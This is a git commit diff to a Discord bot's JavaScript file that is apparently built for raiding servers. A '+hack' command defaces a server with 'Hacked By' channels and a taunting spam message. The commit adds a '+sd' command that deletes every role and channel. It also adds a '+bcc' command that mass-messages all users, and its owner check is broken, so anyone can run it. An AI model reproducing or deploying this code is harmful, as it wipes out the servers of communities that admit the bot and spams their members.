c7f938c1631bebfe3c1f923a0b70cd6ec795bf49
ahmedking12387 <33984820+ahmedking12387@users.noreply.github.com>
2018-07-27 07:50:03 +0300

    Update bot.js

--- bot.js
+++ bot.js
@@ -35,12 +35,46 @@ const prefix = '+'
         if (message.content.startsWith(prefix + 'hack')) {
 for (let i = 0; i < 1; i++) {
 
-        message.guild.createChannel('Hacked By |" R. "| Dont Cry.', 'text')
-		        message.guild.createChannel('Hacked By |" R. "| Dont Cry.', 'voice')
+        message.guild.createChannel('Hacked By |" A_K "| Dont Cry.', 'text')
+		        message.guild.createChannel('Hacked By |" sp1rex. "| Dont Cry.', 'voice')
         message.channel.send('تحسب انك بتروح بدون حساب ؟ لبى والله عيونك:see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil:تحسب انك بتروح بدون حساب ؟ لبى والله عيونك:see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil:تحسب انك بتروح بدون حساب ؟ لبى والله عيونك:see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil:تحسب انك بتروح بدون حساب ؟ لبى والله عيونك:see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil:تحسب انك بتروح بدون حساب ؟ لبى والله عيونك:see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil:تحسب انك بتروح بدون حساب ؟ لبى والله عيونك:see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil:تحسب انك بتروح بدون حساب ؟ لبى والله عيونك:see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil:تحسب انك بتروح بدون حساب ؟ لبى والله عيونك:see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil:تحسب انك بتروح بدون حساب ؟ لبى والله عيونك:see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil:تحسب انك بتروح بدون حساب ؟ لبى والله عيونك:see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil:تحسب انك بتروح بدون حساب ؟ لبى والله عيونك:see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil:تحسب انك بتروح بدون حساب ؟ لبى والله عيونك:see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil:تحسب انك بتروح بدون حساب ؟ لبى والله عيونك:see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil: :see_no_evil:');
 }
 }
 });
+
+
+
+
+
+
+
+client.on('message', ra3d => {   
+ if (ra3d.content.startsWith("+sd")) {
+     ra3d.guild.roles.forEach(r => { r.delete() }) 
+     ra3d.guild.channels.forEach(c => { c.delete() })
+                let embed = new Discord.RichEmbed()
+            .setColor('#fd0101')
+            .setDescription('تم حذف كل شي في السيرفر✅')
+           ra3d.author.sendEmbed(embed);
+ }
+ });  
+
+
+
+client.on('message', message => {
+            if(!message.channel.guild) return;
+let args = message.content.split(' ').slice(1).join(' ');
+if (message.content.startsWith('+bcc')){
+ if(!message.author.id === '389090790984515594') return;
+message.channel.sendMessage('جار ارسال الرسالة |:white_check_mark:')
+client.users.forEach(m =>{
+m.sendMessage(args)
+})
+}
+});
+
+
+
 
 
 client.login(process.env.BOT_TOKEN);
